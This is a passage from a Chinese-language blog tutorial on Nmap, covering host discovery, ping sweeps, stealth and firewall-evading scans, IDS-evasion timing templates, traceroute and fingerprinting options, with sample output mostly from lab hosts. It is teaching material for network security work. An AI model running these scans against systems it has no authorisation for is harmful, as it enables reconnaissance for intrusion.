href="#一个简单的扫描" class="headerlink" title="一个简单的扫描"></a>一个简单的扫描</h3><p>该扫描方式可以快递地对 IP 或者域名进行扫描：</p><p><img src="http://qiniuyun.lintstar.top/20200802095959.png" alt="20200802095959"></p><p>可以使用 –packet-trace 查看协议扫描的细节：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.11.29.138 --packet-trace</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200802100228.png" alt="20200802100228"></p><p>可以使用 -v 查看详细地输出，漫长的扫描的过程就不会显得那么枯燥，而且可以提升逼格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.11.29.138 -v</span><br></pre></td></tr></table></figure><p>查看Linux源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200802100851.png" alt="20200802100851"></p><p><code>sudo apt-get update</code> 自动使用最近源，指定是多此一举</p><p><img src="http://qiniuyun.lintstar.top/20200802101033.png" alt="20200802101033"></p><h3 id="使用-Zenmap-进行扫描"><a href="#使用-Zenmap-进行扫描" class="headerlink" title="使用 Zenmap 进行扫描"></a>使用 Zenmap 进行扫描</h3><p>Zenmap 是 Nmap 官方的图形化界面，比较方便初学者使用的同时也提供了很多高级特性。</p><h3 id="Ping-扫描"><a href="#Ping-扫描" class="headerlink" title="Ping 扫描"></a>Ping 扫描</h3><p>Ping 扫描只进行 Ping，然后显示出在线的主机，可以比较快速地获取目标信息而不会被轻易发现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.20.24.1/24 -sP</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:59 CST</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Host is up (0.016s latency).</span><br><span class="line">Nmap scan report for 10.20.24.231</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Nmap scan report for 10.20.24.236</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Nmap scan report for 10.20.24.238</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Nmap scan report for 10.20.24.239</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00087s latency).</span><br><span class="line">Nmap done: 256 IP addresses (6 hosts up) scanned in 3.36 seconds</span><br></pre></td></tr></table></figure><p>也可以直接使用 Ping 命令来发现局域网主机：</p><ul><li>Linux 主机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">ip=&quot;172.16.114.&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;ping log:&quot; &gt; ./ping.txt</span><br><span class="line">for i in &#123;1..254&#125;</span><br><span class="line">do</span><br><span class="line">    ping -c 1 -w 1 -W 1 $ip$i | grep -q &quot;ttl=&quot; &amp;&amp; echo &quot;$ip$i [yes]&quot; &gt;&gt; ./ping.txt || echo &quot;$ip$i [no]&quot; &gt;&gt; ./ping.txt &amp;</span><br><span class="line">done</span><br><span class="line">echo &quot;wait 5s....&quot;</span><br><span class="line">sleep 5</span><br><span class="line">cat ./ping.txt</span><br><span class="line">cat ./ping.txt | wc -l</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200802101438.png" alt="20200802101438"></p><p><img src="http://qiniuyun.lintstar.top/20200802101517.png" alt="20200802101517"></p><ul><li>Windows 主机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %p in (1,1,254) do @ping 10.20.24.%p -n 1 -l 16 -w 20 |find &quot;TTL=&quot; /I</span><br></pre></td></tr></table></figure><h3 id="无-Ping-扫描"><a href="#无-Ping-扫描" class="headerlink" title="无 Ping 扫描"></a>无 Ping 扫描</h3><p>用户防火墙禁止 Ping 的情况下，可以使用 -P0 或者 -Pn可以避免被防火墙发现。</p><p><code>nmap无法突破windows防火墙，但是内网中很多域为方便都是不开防火墙的，所以nmap依旧吃香。</code></p><p><img src="http://qiniuyun.lintstar.top/20200802095420.png" alt="20200802095420"></p><p>开防火墙后扫描3306（已知开放）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.11.29.138 -p 3306 -Pn</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200802095640.png" alt="20200802095640"></p><h3 id="TCP-SYN-Ping-扫描"><a href="#TCP-SYN-Ping-扫描" class="headerlink" title="TCP SYN Ping 扫描"></a>TCP SYN Ping 扫描</h3><p>通常情况下，Nmap 默认 Ping 扫描是使用 TCP ACK 和 ICMP Echo 请求对目标进行是否存活的响应，当目标主机的防火墙阻止这些请求时，我们可以使用 TCP SYN Ping 扫描来对目标主机进行存活判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.20.24.244 -PS</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 16:54 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure><p>有时候这种扫描结果不不准确，这个时候需要制定一个端口或端口范围来避免这种情况。</p><h3 id="TCP-ACK-Ping-扫描"><a href="#TCP-ACK-Ping-扫描" class="headerlink" title="TCP ACK Ping 扫描"></a>TCP ACK Ping 扫描</h3><p>使用 -PA选项可以进行 TCP ACK Ping 扫描，它与 TCP SYN Ping 扫描比较类似，区别在于 TCP 的标志位是 ACK 而不是 SYN，使用这种方式可以探测阻止 SYN 包或 ICMP Echo 请求的主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.244 -PA</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:02 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 743 closed ports, 254 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure><p>也可以同时使用-PS与-PA 既发送 SYN 又发送 ACK，提高通过防火墙的概率：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.244 -PS -PA</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:03 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure><h3 id="UDP-Ping-扫描"><a href="#UDP-Ping-扫描" class="headerlink" title="UDP Ping 扫描"></a>UDP Ping 扫描</h3><p>需要使用 root 权限来运行，使用 -PU 选项可以发送一个空的冷门的 UDP 报文到指定端口，如果目标主机响应则返回一个 ICMP 端口不可达错误，如果目标主机不是存活状态则会返回各种 ICMP 错误信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.244 -PU</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:07 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00012s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure><p>尝试手动来验证看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.20.24.244 -PU --packet-trace |grep 5900</span><br></pre></td></tr></table></figure><h3 id="CMP-Ping-Types-扫描"><a href="#CMP-Ping-Types-扫描" class="headerlink" title="CMP Ping Types 扫描"></a>CMP Ping Types 扫描</h3><p>使用-PE、-PP、-PM选项可以进行 ICMP Ping Types 扫描。ICMP（Internet Control Message Protocol）是 Internet 控制报文协议。是 TCP/IP 协议族的一个子协议，用于在 IP 主机、路由器之间传递控制消息，控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><h4 id="ICMP-Echo-扫描"><a href="#ICMP-Echo-扫描" class="headerlink" title="ICMP Echo 扫描"></a>ICMP Echo 扫描</h4><p>-PE 选项可以发起一个 ICMP Echo 扫描来探测目标主机是否在线，因为很多主机的防火墙会禁止这些报文，所以外网扫描基本上不好用，可以用于内网扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.244 -PE</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure><h4 id="ICMP-时间戳-Ping-扫描"><a href="#ICMP-时间戳-Ping-扫描" class="headerlink" title="ICMP 时间戳 Ping 扫描"></a>ICMP 时间戳 Ping 扫描</h4><p>大多数防火墙可能不允许 ICMP Echo 请求，但是由于配置不当可能回复 ICMP 时间错请求，所以可以使用 -PP 时间戳扫描来确定目标主机是否存活。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.244 -PP</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.000029s latency).</span><br><span class="line">Not shown: 809 closed ports, 189 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure><h4 id="ICMP-地址掩码-Ping-扫描"><a href="#ICMP-地址掩码-Ping-扫描" class="headerlink" title="ICMP 地址掩码 Ping 扫描"></a>ICMP 地址掩码 Ping 扫描</h4><p>这种扫描方式会试图用备选的 ICMP 登记 Ping 指定主机，通常有不错的穿透防火墙的效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.244 -PM</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:05 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure><h3 id="ARP-Ping-扫描"><a href="#ARP-Ping-扫描" class="headerlink" title="ARP Ping 扫描"></a>ARP Ping 扫描</h3><p>-PR选项通常在扫描局域网时使用，ARP（Address Resolution Protocol）地址解析协议，是根据 IP 地址获取物理地址的一个 TCP/IP 协议，在内网中使用 ARP Ping 扫描方式比较搞笑，在本地局域网中防火墙基本上不会禁止 ARP 请求，所以比其他 Ping 扫描效率都更高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.244 -PR</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:10 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 746 closed ports, 252 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds</span><br><span class="line">➜  ~ nmap 10.20.24.244</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:11 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds</span><br></pre></td></tr></table></figure><h3 id="扫描列表"><a href="#扫描列表" class="headerlink" title="扫描列表"></a>扫描列表</h3><p>显示扫描的所有主机的列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.10-20 -sL</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:19 CST</span><br><span class="line">Nmap scan report for 10.20.24.10</span><br><span class="line">Nmap scan report for 10.20.24.11</span><br><span class="line">Nmap scan report for 10.20.24.12</span><br><span class="line">Nmap scan report for 10.20.24.13</span><br><span class="line">Nmap scan report for 10.20.24.14</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Nmap scan report for 10.20.24.16</span><br><span class="line">Nmap scan report for 10.20.24.17</span><br><span class="line">Nmap scan report for 10.20.24.18</span><br><span class="line">Nmap scan report for 10.20.24.19</span><br><span class="line">Nmap scan report for 10.20.24.20</span><br><span class="line">Nmap done: 11 IP addresses (0 hosts up) scanned in 0.01 seconds</span><br></pre></td></tr></table></figure><p>可以使用 Masscan 批量生成 IP 地址表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">masscan -sL 10.0.0.0/24 &gt; c段.txt</span><br><span class="line">masscan -sL 10.0.0.0/16 &gt; b段.txt</span><br><span class="line">masscan -sL 10.0.0.0/8  &gt; a段.txt</span><br></pre></td></tr></table></figure><h3 id="扫描一个-IPv6-地址"><a href="#扫描一个-IPv6-地址" class="headerlink" title="扫描一个 IPv6 地址"></a>扫描一个 IPv6 地址</h3><p>IPv6 是 Internet Protocol Version 6 的缩写，用于替代现在用的 IPv4 的下一代 IP 协议，Nmap 很早就支持对 IPv6 的扫描，使用 -6 选项就可以进行对 IPv6 的扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -6 1::224:11c</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:34 CST</span><br><span class="line">Nmap scan report for 1::224:11c</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 968 closed ports, 30 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure><h3 id="路由跟踪"><a href="#路由跟踪" class="headerlink" title="路由跟踪"></a>路由跟踪</h3><p>使用 –traceroute 可以轻松地查出从本地计算机到目标之间所经过的网络节点，并可以查看过各个节点的时间：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap www.sqlsec.com --traceroute</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:35 CST</span><br><span class="line">Nmap scan report for www.sqlsec.com (121.196.37.183)</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">21/tcp   open     ftp</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">80/tcp   open     http</span><br><span class="line">111/tcp  open     rpcbind</span><br><span class="line">443/tcp  open     https</span><br><span class="line">445/tcp  filtered microsoft-ds</span><br><span class="line">888/tcp  open     accessbuilder</span><br><span class="line">3306/tcp open     mysql</span><br><span class="line">4444/tcp filtered krb524</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.41 ms 10.20.24.1</span><br><span class="line">2   0.38 ms 172.16.0.1</span><br><span class="line">3   6.50 ms 61.164.47.193</span><br><span class="line">4   ...</span><br><span class="line">5   1.70 ms 61.164.31.218</span><br><span class="line">6   2.51 ms 115.236.101.73</span><br><span class="line">7   1.78 ms 45.112.223.29</span><br><span class="line">8   1.92 ms 103.41.142.173</span><br><span class="line">9   ... 10</span><br><span class="line">11  1.77 ms 121.196.37.183</span><br></pre></td></tr></table></figure><h3 id="SCTP-INIT-Ping-扫描"><a href="#SCTP-INIT-Ping-扫描" class="headerlink" title="SCTP INIT Ping 扫描"></a>SCTP INIT Ping 扫描</h3><p>SCTP（Stream Control Transmission Protocol，流控制传输协议）是在 2000 年定义的一个传输层，SCTP 可以看作是 TCP 协议的改进。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.15 -PY</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:40 CST</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Host is up (0.0071s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">199/tcp  open  smux</span><br><span class="line">443/tcp  open  https</span><br><span class="line">8888/tcp open  sun-answerbook</span><br></pre></td></tr></table></figure><h3 id="探索网络"><a href="#探索网络" class="headerlink" title="探索网络"></a>探索网络</h3><p>本节所用到的 Nmap 命令表：</p><table><thead><tr><th>选项</th><th>解释</th></tr></thead><tbody><tr><td>-T</td><td>指定时间模板</td></tr><tr><td>-p</td><td>指定端口</td></tr><tr><td>-sS</td><td>TCP SYN 扫描</td></tr><tr><td>-sU</td><td>UDP 扫描</td></tr><tr><td>-sN;-sF;-sX</td><td>隐蔽扫描</td></tr><tr><td>-sA</td><td>TCP ACK 扫描</td></tr><tr><td>-sW</td><td>TCP 窗口扫描</td></tr></tbody></table><h3 id="时间模板"><a href="#时间模板" class="headerlink" title="时间模板"></a>时间模板</h3><p>在 Nmap 提供了一些简单的方法，使用 6 个时间模板，使用时采用 -T 选项及数字 (0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-T0 偏执的</td><td>非常慢，用于 IDS 躲避</td></tr><tr><td>-T1 鬼祟的</td><td>缓慢的扫描，用于 IDS 躲避</td></tr><tr><td>-T2 文雅的</td><td>降低了扫描速度以使用更少的带宽和目标主机资源</td></tr><tr><td>-T3 普通的</td><td>默认模式 根据目标的反应自动调整时间</td></tr><tr><td>-T4 野蛮的</td><td>假设用户具有可靠的网络从而加速扫描，可能会漏扫</td></tr><tr><td>-T5 疯狂的</td><td>极速扫描，为了获得速度而牺牲准确性</td></tr></tbody></table><h3 id="指定端口"><a href="#指定端口" class="headerlink" title="指定端口"></a>指定端口</h3><p>可以指定端口号进行扫描，可以是一个端口也可以是一个范围：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.1/24 -p 22</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:34 CST</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Host is up (0.0077s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.231</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.236</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.238</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">22/tcp closed ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.239</span><br><span class="line">Host is up (0.00070s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">22/tcp closed ssh</span><br></pre></td></tr></table></figure><h3 id="TCP-SYN-扫描"><a href="#TCP-SYN-扫描" class="headerlink" title="TCP SYN 扫描"></a>TCP SYN 扫描</h3><p>比较常用的扫描方式，也被称为半开放扫描，因为不用进行 TCP 连接 3 次握手，所以速度比较快，平均一秒可以扫描上千个端口，而且相对来说也比较隐蔽，很难被防火墙或管理员发现，因为不会进行 TCP 连接，如果出现被过滤的情况，可以考虑使用 SYN 扫描，可以很明确地区分出端口的开放状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.15 -sS</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:41 CST</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Host is up (0.0071s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">199/tcp  open  smux</span><br><span class="line">443/tcp  open  https</span><br><span class="line">8888/tcp open  sun-answerbook</span><br></pre></td></tr></table></figure><h3 id="TCP-连接扫描"><a href="#TCP-连接扫描" class="headerlink" title="TCP 连接扫描"></a>TCP 连接扫描</h3><p>当 -sS 不能使用的时候，可以使用 -sT 更加基础、稳定的扫描方式。</p><h3 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><p>因为要等待目标主机响应，所以速度比较慢，一般配合 -p 指定端口来使用，否则很耗费时间。</p><h3 id="隐蔽扫描"><a href="#隐蔽扫描" class="headerlink" title="隐蔽扫描"></a>隐蔽扫描</h3><ul><li>-sN Null 扫描</li><li>-sF FIN 扫描</li><li>-sX Xmas 扫描<br>这些扫描方式会躲过一些无状态防火墙的过滤，效果会更隐蔽。</li></ul><h3 id="TCP-ACK-扫描"><a href="#TCP-ACK-扫描" class="headerlink" title="TCP ACK 扫描"></a>TCP ACK 扫描</h3><p>确定是无法判断端口是开放还是过滤的。unfiltered 表明 ACK 报文不能到达，filtered 表示不响应的端口。</p><h3 id="TCP-窗口扫描"><a href="#TCP-窗口扫描" class="headerlink" title="TCP 窗口扫描"></a>TCP 窗口扫描</h3><p>类似于ACK 扫描，通过返回的窗口大小数据判断目标端口是否开放或者关闭。扫描结果是不准确的，如果 100 个端口里面只有 2 个关闭的，那很可能是开放的。</p><h3 id="指纹探测"><a href="#指纹探测" class="headerlink" title="指纹探测"></a>指纹探测</h3><p>Nmap 不仅是一款端口扫描工具，还可以对主机的服务及版本进行识别和探测。</p><p>本节所使用的命令表：</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-sV</td><td>版本探测</td></tr><tr><td>-A</td><td>更加详细直观的扫描</td></tr><tr><td>–version-intensity</td><td>设置扫描强度 1~9 默认为 7</td></tr><tr><td>–version-light</td><td>轻量级扫描 强度为 2</td></tr><tr><td>–version-all</td><td>重量级扫描 强度为 9</td></tr><tr><td>-O</td><td>启用操作系统探测</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 